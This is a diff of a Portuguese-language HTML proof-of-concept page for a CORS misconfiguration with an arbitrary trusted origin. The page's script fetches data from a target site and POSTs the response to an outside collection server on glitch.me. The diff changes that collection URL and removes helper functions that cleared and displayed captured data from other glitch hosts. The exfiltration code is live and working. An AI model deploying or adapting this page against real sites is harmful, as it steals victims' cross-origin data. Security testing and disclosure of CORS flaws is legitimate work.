@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC de CORS - Payload Alyce</title>
+    <title>PoC de CORS</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -23,17 +23,15 @@
             padding: 10px 20px;
             font-size: 16px;
             cursor: pointer;
-            margin-right: 10px;
         }
     </style>
 </head>
 <body>
-    <h1>PoC de CORS - Payload Alyce</h1>
+    <h1>PoC de CORS</h1>
     <p>Esta página demonstra a vulnerabilidade CORS com origem arbitrária confiável.</p>
-    <p>Abaixo demonstra a interceptação das informações da sua página.</p>
+    <p>Se você está vendo esta mensagem, a página de PoC do CORS está funcionando corretamente.</p>
 
     <button onclick="validateCORS()">Verificar Vulnerabilidade</button>
-    <button onclick="clearData()">Limpar Dados</button>
 
     <div class="status" id="status">
         Status: Aguardando verificação...
@@ -55,13 +53,8 @@
                         statusDiv.style.backgroundColor = '#e0ffe0';
                         // Enviar dados para o servidor de coleta
                         var exfiltrate = new XMLHttpRequest();
-                        exfiltrate.open('POST', 'https://cyclic-magical-ankle.glitch.me', true);
+                        exfiltrate.open('POST', 'https://cyber-boulder-barge.glitch.me/collect', true);
                         exfiltrate.setRequestHeader('Content-Type', 'application/json');
-                        exfiltrate.onreadystatechange = function() {
-                            if (exfiltrate.readyState == 4 && exfiltrate.status == 200) {
-                                updateData();
-                            }
-                        };
                         exfiltrate.send(JSON.stringify({data: xhr.responseText}));
                     } else {
                         statusDiv.innerHTML = 'Status: Falha ao obter dados. Código de status: ' + xhr.status;
@@ -79,53 +72,6 @@
             };
             xhr.send();
         }
-
-        function clearData() {
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://cyclic-magical-ankle.glitch.me/clear', true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4) {
-                    var statusDiv = document.getElementById('status');
-                    console.log('Clear Data XHR Status:', xhr.status);
-                    console.log('Clear Data XHR Response:', xhr.responseText);
-                    if (xhr.status == 200) {
-                        statusDiv.innerHTML = 'Status: Dados apagados com sucesso!';
-                        statusDiv.style.borderColor = 'blue';
-                        statusDiv.style.backgroundColor = '#e0f7ff';
-                        updateData();
-                    } else {
-                        statusDiv.innerHTML = 'Status: Falha ao apagar dados. Código de status: ' + xhr.status;
-                        statusDiv.style.borderColor = 'red';
-                        statusDiv.style.backgroundColor = '#ffe0e0';
-                    }
-                }
-            };
-            xhr.onerror = function() {
-                var statusDiv = document.getElementById('status');
-                statusDiv.innerHTML = 'Status: Erro na solicitação de limpeza.';
-                statusDiv.style.borderColor = 'red';
-                statusDiv.style.backgroundColor = '#ffe0e0';
-                console.error('Erro na solicitação de limpeza:', xhr);
-            };
-            xhr.send();
-        }
-
-        function updateData() {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://potent-intriguing-dichondra.glitch.me/data', true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4 && xhr.status == 200) {
-                    var statusDiv = document.getElementById('status');
-                    console.log('Update Data XHR Status:', xhr.status);
-                    console.log('Update Data XHR Response:', xhr.responseText);
-                    statusDiv.innerHTML = 'Dados atuais: ' + xhr.responseText;
-                }
-            };
-            xhr.send();
-        }
-
-        // Atualizar dados ao carregar a página
-        window.onload = updateData;
     </script>
 </body>
 </html>
